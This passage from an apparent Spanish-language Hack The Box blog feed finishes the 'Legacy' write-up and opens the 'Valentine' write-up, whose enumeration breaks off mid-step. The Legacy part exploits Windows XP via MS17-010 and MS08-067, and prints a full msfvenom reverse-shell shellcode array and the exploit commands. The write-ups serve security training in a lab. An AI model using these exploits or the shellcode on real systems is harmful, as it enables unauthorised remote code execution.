&lt;p&gt;Como vemos que la maquina corresponde &lt;code&gt;Windows XP&lt;/code&gt;, podemos explotar el &lt;code&gt;eternal blue&lt;/code&gt;, asi que vamos a explotarlo usando el exploit de github de warawit.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Descargamos al repositorio y ejecutamos el &lt;code&gt;checker.py&lt;/code&gt;, para encontrar &lt;code&gt;named pipes&lt;/code&gt; vulnerables.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Ejectamos el &lt;code&gt;checker.py&lt;/code&gt; el cual nos reporta dos &lt;code&gt;named pipes&lt;/code&gt; de los que podemos abusar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos abriremos el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt; el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción &lt;code&gt;service_exec&lt;/code&gt; y comentaremos las lineas previas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello, podemos descarganos el ejecutable de &lt;code&gt;nc&lt;/code&gt;, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión &lt;code&gt;1.12&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.&lt;/p&gt;

&lt;p&gt;En mi caso yo usare el &lt;code&gt;nc.exe&lt;/code&gt; que contempla el repositorio de &lt;code&gt;danil miesler&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
❯ ls
 MS17-010   nc.exe   netcat-win32-1.12.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Procedemos a montar nuestro recurso compartido, donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; por el puerto que configuramos, en este caso el correspondiente a el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;zzz_exploit.py&lt;/code&gt; junto con el named pipe que previamente nos reporto el &lt;code&gt;checker.py&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.4 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86101b30
SESSION: 0xe1b1cc68
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1046.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora podemos ir al directorio del usuario john y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Documents and Settings\john\Desktop&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19     &amp;lt;DIR&amp;gt;          .
16/03/2017  09:19     &amp;lt;DIR&amp;gt;          ..
16/03/2017  09:19                 32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.342.070.272 bytes free

C:\Documents and Settings\john\Desktop&amp;gt;type user.txt
type user.txt
e69af0e4f443de7e36876fda4ec7644f
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts &lt;code&gt;smb-vuln\*&lt;/code&gt; de nmap en el puerto &lt;code&gt;445&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;QUITTING!
❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
Nmap scan report for 10.10.10.4
Host is up (0.12s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250

Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nmap nos reporta que el servicio es vulnerable a &lt;code&gt;ms08-067&lt;/code&gt; ya que corresponde a un &lt;code&gt;Windows XP&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para poder explotarla vamos a descargarnos un exploit de &lt;code&gt;andyacer&lt;/code&gt; de github:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/andyacer/ms08_067&quot;&gt;https://github.com/andyacer/ms08_067&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un &lt;code&gt;shellcode&lt;/code&gt; el cual debemos ingresar al &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Para ello vamos a generar el shellcode usando &lt;code&gt;msfvenom&lt;/code&gt;, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of c file: 1491 bytes
unsigned char buf[] = 
&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76&quot;
&quot;\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99&quot;
&quot;\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4&quot;
&quot;\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5&quot;
&quot;\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f&quot;
&quot;\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48&quot;
&quot;\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc&quot;
&quot;\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec&quot;
&quot;\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9&quot;
&quot;\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98&quot;
&quot;\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97&quot;
&quot;\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee&quot;
&quot;\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9&quot;
&quot;\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9&quot;
&quot;\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d&quot;
&quot;\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10&quot;
&quot;\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08&quot;
&quot;\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c&quot;
&quot;\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda&quot;
&quot;\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd&quot;
&quot;\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e&quot;
&quot;\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf&quot;
&quot;\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2&quot;
&quot;\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79&quot;
&quot;\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ese shellcode generado, ahora vamos a introducirlo en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos el exploit sin antes ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la conexión, ahora podemos ir al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.4.
Ncat: Connection from 10.10.10.4:1047.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&amp;gt; cd &quot;Documents and Settings&quot;
cd &quot;Documents and Settings&quot;

C:\Documents and Settings&amp;gt;dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings

16/03/2017  09:07     &amp;lt;DIR&amp;gt;          .
16/03/2017  09:07     &amp;lt;DIR&amp;gt;          ..
16/03/2017  09:07     &amp;lt;DIR&amp;gt;          Administrator
16/03/2017  08:29     &amp;lt;DIR&amp;gt;          All Users
16/03/2017  08:33     &amp;lt;DIR&amp;gt;          john
               0 File(s)              0 bytes
               5 Dir(s)   6.403.846.144 bytes free

C:\Documents and Settings&amp;gt;cd Administrator\Desktop
cd Administrator\Desktop

C:\Documents and Settings\Administrator\Desktop&amp;gt;type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Legacy</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Legacy</guid>
        
        <category>SMB Enumeration</category>
        
        <category>Eternal Blue explotation</category>
        
        <category>(MS17-010)</category>
        
        <category>(MS08-067)</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Valentine - htb writeup</title>
        <description>&lt;p&gt;Hola, el dia de hoy vamos a resolver la máquina &lt;code&gt;Valentine&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; de dificultad facil, la cual explotaremos abusando de una vulnerabilidad en el servicio &lt;code&gt;ssl&lt;/code&gt; mediante la cual podremos leer registros de la memoria del servidor, obteniendo una credencial que nos permitira acceder al sistema usando una clave publica y finalmente haremos de dos formas la elevación de privilegios, una en la cual abusaremos de una &lt;code&gt;socket file&lt;/code&gt; de tmux y otra donde explotaremos el kernel vulnerable a el &lt;code&gt;dirty cow&lt;/code&gt; y convertirnos en el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Asi que a darle con todo!&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Valentine
❯ ls
 Valentine
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.79
PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=382 ms

--- 10.10.10.79 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 382.225/382.225/382.225/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.79 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:06 GMT
Initiating SYN Stealth Scan at 23:06
Scanning 10.10.10.79 [65535 ports]
Discovered open port 80/tcp on 10.10.10.79
Discovered open port 443/tcp on 10.10.10.79
Discovered open port 22/tcp on 10.10.10.79
Completed SYN Stealth Scan at 23:06, 18.00s elapsed (65535 total ports)
Nmap scan report for 10.10.10.79
Host is up, received user-set (0.12s latency).
Scanned at 2023-06-24 23:06:26 GMT for 18s
Not shown: 65479 closed tcp ports (reset), 53 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.16 seconds
           Raw packets sent: 88724 (3.904MB) | Rcvd: 86353 (3.454MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80,443 10.10.10.79 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-24 23:07 GMT
Nmap scan report for 10.10.10.79
Host is up (0.37s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2023-06-24T23:07:52+00:00; -2s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: -2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.93 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 5.9p1 Debian 5ubuntu1.10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.2.22&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;443&lt;/td&gt;
      &lt;td&gt;HTTPS&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.2.22&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vemos que se estan ejecutando servicios web, asi que con &lt;code&gt;whatweb&lt;/code&gt; vamos a tratar de identificar sus tecnologias.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.79
http://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
❯ whatweb https://10.10.10.79
https://10.10.10.79 [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.10.10.79], PHP[5.3.10-1ubuntu3.26], X-Powered-By[PHP/5.3.10-1ubuntu3.26]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que el servicio usa &lt;code&gt;php&lt;/code&gt;, seguidamente vamos a abrirlo en el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como obervamos una imagen, vamos a descargarla para tratar si existen metadatos ocultos, para ello usaremos &lt;code&gt;exiftool&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ exiftool valentine.jpg
ExifTool Version Number         : 12.16
File Name                       : valentine.jpg
Directory                       : .
File Size                       : 150 KiB
File Modification Date/Time     : 2023:06:24 23:14:44+00:00
File Access Date/Time           : 2023:06:24 23:14:44+00:00
File Inode Change Date/Time     : 2023:06:24 23:15:00+00:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 1200
Image Height                    : 627
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1200x627
Megapixels                      : 0.752
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;No encontramos información relevante en la imagen, asi que vamos a tratar de enumerar directorios en la web, para ello vamos a usar &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.79/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.79/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000015:   200        1 L      2 W        38 Ch       &quot;index&quot;                                                                                                               
000000834:   301        9 L      28 W       308 Ch      &quot;dev&quot;                                                                                                                 
000023112:   200        27 L     54 W       554 Ch      &quot;encode&quot;                                                                                                              
000024243:   200        25 L     54 W       552 Ch      &quot;decode&quot;                                                                                                              
000029901:   200        619 L    5759 W     145482 Ch   &quot;omg&quot;                                                                                                                 
000045240:   200        1 L      2 W        38 Ch       &quot;http://10.10.10.79/&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que existe un directorio &lt;code&gt;dev&lt;/code&gt;, y si lo visulizamos en el navegador este tiene como contenido dos archivos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si visualizamos el archivo &lt;code&gt;hype_key&lt;/code&gt;, vemos contenido en formato hexadecimal.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Valentine/vale3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a transformar el contenido para que ver a que corresponde para ello usaremos &lt;code&gt;xxd&lt;/code&gt;.&lt;/p&gt;

